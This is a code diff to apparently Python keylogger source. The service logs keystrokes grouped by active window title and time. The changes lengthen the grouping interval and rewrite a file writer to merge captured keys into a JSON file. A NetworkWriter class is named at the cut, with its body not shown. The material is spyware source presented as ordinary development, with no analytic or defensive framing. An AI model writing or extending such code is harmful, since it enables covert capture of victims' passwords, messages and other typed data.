@@ -1,5 +1,5 @@
-import requests,time,ToolBox,pygetwindow,json,random,string
-from Interface import IKeyLogger,IKeyLoggerManager,Write
+import requests,time,ToolBox,pygetwindow,json,random,string,os
+from Interface import IKeyLogger,Write
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.__logged_keys = {}
@@ -13,7 +13,7 @@ class KeyLoggerService(IKeyLogger):
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
         active_window = pygetwindow.getActiveWindowTitle()
 
-        if self.__last_type_time is None or current_time - self.__last_type_time >= 2 or active_window != self.__last_window:
+        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
             self.__last_record = active_window + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
@@ -38,14 +38,24 @@ class FileWriter(Write):
     def __init__(self,path=None):
         self.path = ToolBox.get_file_path()
 
-    def write(self, data:dict[str:str]) -> bool:
+    def write(self, data: dict[str, str]) -> bool:
         try:
-            with open(self.path,"a",encoding='utf-8') as file:
-                convert_data = json.dumps(data)
-                file.write(convert_data)
-                print(self.path)
-                return True
-        except IOError:
+            if os.path.exists(self.path) and os.path.getsize(self.path) > 0:
+                with open(self.path, 'r', encoding='utf-8') as file:
+                    try:
+                        data_dict = json.load(file)
+                    except json.JSONDecodeError:
+                        data_dict = {}
+            else:
+                data_dict = {}
+            for key, val in data.items():
+                data_dict[key] = data_dict.get(key, "") + val
+            with open(self.path, "w", encoding='utf-8') as file:
+                json.dump(data_dict, file, ensure_ascii=False, indent=4)
+
+            return True
+
+        except (IOError, json.JSONDecodeError):
             return False
 
 class NetworkWriter(Write):
